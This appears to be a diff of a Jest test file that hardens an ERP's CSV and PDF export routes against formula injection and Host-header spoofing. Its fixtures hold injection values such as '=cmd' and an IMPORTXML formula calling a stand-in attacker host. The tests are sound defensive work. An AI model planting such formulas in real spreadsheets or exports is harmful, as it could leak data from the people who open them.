@@ -34,6 +34,9 @@ jest.mock('@/shared/lib/audit', () => ({
 
 jest.mock('@/shared/lib/usuario-query', () => ({
   buildUsuarioSelect: jest.fn().mockResolvedValue('id,email,nomeCompleto,nivel,status,criadoEm'),
+  getUsuarioColumns: jest
+    .fn()
+    .mockResolvedValue(new Set(['id', 'email', 'nomeCompleto', 'nivel', 'status', 'criadoEm'])),
 }));
 
 jest.mock('@/shared/lib/services/report-pdf-html', () => ({
@@ -49,13 +52,14 @@ import { generateReportPDFFromHTML } from '@/shared/lib/services/report-pdf-html
 const { Request, Response, Headers } = require('node-fetch');
 Object.assign(global, { Request, Response, Headers });
 if (typeof Response.json !== 'function') {
-  Response.json = (data: unknown, init?: ResponseInit) => new Response(JSON.stringify(data), {
-    ...init,
-    headers: {
-      'content-type': 'application/json',
-      ...(init?.headers ?? {}),
-    },
-  });
+  Response.json = (data: unknown, init?: ResponseInit) =>
+    new Response(JSON.stringify(data), {
+      ...init,
+      headers: {
+        'content-type': 'application/json',
+        ...(init?.headers ?? {}),
+      },
+    });
 }
 
 const { POST: usuariosCsvPOST } = require('../usuarios/export/csv/route');
@@ -95,7 +99,11 @@ describe('P2 export hardening', () => {
   beforeEach(() => {
     jest.clearAllMocks();
     process.env.APP_URL = 'https://erp.gladpros.com';
-    rateLimitMock.mockResolvedValue({ allowed: true, remaining: 99, resetTime: Date.now() + 60_000 });
+    rateLimitMock.mockResolvedValue({
+      allowed: true,
+      remaining: 99,
+      resetTime: Date.now() + 60_000,
+    });
     requireUserMock.mockResolvedValue({ id: '1', role: 'ADMIN', empresaId: 1 });
     requireClientePermissionMock.mockResolvedValue({ id: '1', role: 'ADMIN', empresaId: 1 });
     canMock.mockReturnValue(true);
@@ -114,18 +122,22 @@ describe('P2 export hardening', () => {
       { COLUMN_NAME: 'status' },
       { COLUMN_NAME: 'criadoEm' },
     ]);
-    queryRawUnsafeMock.mockResolvedValue([{
-      id: 1,
-      email: '+evil@example.com',
-      nomeCompleto: '=cmd',
-      nivel: 'ADMIN',
-      status: 'ATIVO',
-      criadoEm: new Date('2026-05-01T12:00:00-05:00'),
-    }]);
+    queryRawUnsafeMock.mockResolvedValue([
+      {
+        id: 1,
+        email: '+evil@example.com',
+        nomeCompleto: '=cmd',
+        nivel: 'ADMIN',
+        status: 'ATIVO',
+        criadoEm: new Date('2026-05-01T12:00:00-05:00'),
+      },
+    ]);
 
-    const response = await usuariosCsvPOST(jsonRequest('/api/usuarios/export/csv', {
-      filters: { q: 'admin' },
-    }));
+    const response = await usuariosCsvPOST(
+      jsonRequest('/api/usuarios/export/csv', {
+        filters: { q: 'admin' },
+      }),
+    );
     const csv = await response.text();
     const [sql, ...params] = queryRawUnsafeMock.mock.calls[0];
 
@@ -137,60 +149,76 @@ describe('P2 export hardening', () => {
   });
 
   it('generates usuario PDF from configured APP_URL instead of request Host', async () => {
-    const response = await usuariosPdfPOST(jsonRequest('/api/usuarios/export/pdf', {}, {
-      host: 'attacker.test',
-      cookie: 'authToken=safe-token; other=ignore-me',
-    }));
+    const response = await usuariosPdfPOST(
+      jsonRequest(
+        '/api/usuarios/export/pdf',
+        {},
+        {
+          host: 'attacker.test',
+          cookie: 'authToken=safe-token; other=ignore-me',
+        },
+      ),
+    );
 
     expect(response.status).toBe(200);
-    expect(generatePdfMock).toHaveBeenCalledWith(expect.objectContaining({
-      baseUrl: 'https://erp.gladpros.com',
-      cookie: 'authToken=safe-token',
-    }));
+    expect(generatePdfMock).toHaveBeenCalledWith(
+      expect.objectContaining({
+        baseUrl: 'https://erp.gladpros.com',
+        cookie: 'authToken=safe-token',
+      }),
+    );
     expect(JSON.stringify(generatePdfMock.mock.calls[0][0])).not.toContain('attacker.test');
   });
 
   it('caps clientes CSV export with take and skip when no explicit selection is provided', async () => {
-    clienteFindManyMock.mockResolvedValue([{
-      id: 1,
-      tipo: 'PF',
-      nomeCompleto: 'John Smith',
-      razaoSocial: null,
-      nomeFantasia: null,
-      email: 'john@example.com',
-      telefone: null,
-      addressCity: 'Dallas',
-      addressState: 'TX',
-      status: 'ATIVO',
-      criadoEm: new Date('2026-05-01T12:00:00-05:00'),
-    }]);
+    clienteFindManyMock.mockResolvedValue([
+      {
+        id: 1,
+        tipo: 'PF',
+        nomeCompleto: 'John Smith',
+        razaoSocial: null,
+        nomeFantasia: null,
+        email: 'john@example.com',
+        telefone: null,
+        addressCity: 'Dallas',
+        addressState: 'TX',
+        status: 'ATIVO',
+        criadoEm: new Date('2026-05-01T12:00:00-05:00'),
+      },
+    ]);
 
-    const response = await clientesCsvPOST(jsonRequest('/api/clientes/export/csv', {
-      filters: { page: 2, pageSize: 10 },
-    }));
+    const response = await clientesCsvPOST(
+      jsonRequest('/api/clientes/export/csv', {
+        filters: { page: 2, pageSize: 10 },
+      }),
+    );
 
     expect(response.status).toBe(200);
-    expect(clienteFindManyMock).toHaveBeenCalledWith(expect.objectContaining({
-      take: 10,
-      skip: 10,
-    }));
+    expect(clienteFindManyMock).toHaveBeenCalledWith(
+      expect.objectContaining({
+        take: 10,
+        skip: 10,
+      }),
+    );
   });
 
   it('neutralizes spreadsheet formulas in propostas CSV export', async () => {
-    propostaFindManyMock.mockResolvedValue([{
-      numeroProposta: 'P-001',
-      titulo: '=IMPORTXML("http://attacker.test")',
-      status: 'ENVIADA',
-      precoPropostaCliente: 100,
-      valorEstimado: 80,
-      criadoEm: new Date('2026-05-01T12:00:00-05:00'),
-      validadeProposta: null,
-      assinadaEm: null,
-      contatoNome: '@bad',
-      contatoEmail: 'client@example.com',
-      localExecucaoEndereco: '123 Main St',
-      Cliente: { nomeCompleto: 'John Smith', email: 'john@example.com' },
-    }]);
+    propostaFindManyMock.mockResolvedValue([
+      {
+        numeroProposta: 'P-001',
+        titulo: '=IMPORTXML("http://attacker.test")',
+        status: 'ENVIADA',
+        precoPropostaCliente: 100,
+        valorEstimado: 80,
+        criadoEm: new Date('2026-05-01T12:00:00-05:00'),
+        validadeProposta: null,
+        assinadaEm: null,
+        contatoNome: '@bad',
+        contatoEmail: 'client@example.com',
+        localExecucaoEndereco: '123 Main St',
+        Cliente: { nomeCompleto: 'John Smith', email: 'john@example.com' },
+      },
+    ]);
 
     const response = await propostasCsvPOST(jsonRequest('/api/propostas/export/csv', {}));
     const csv = await response.text();
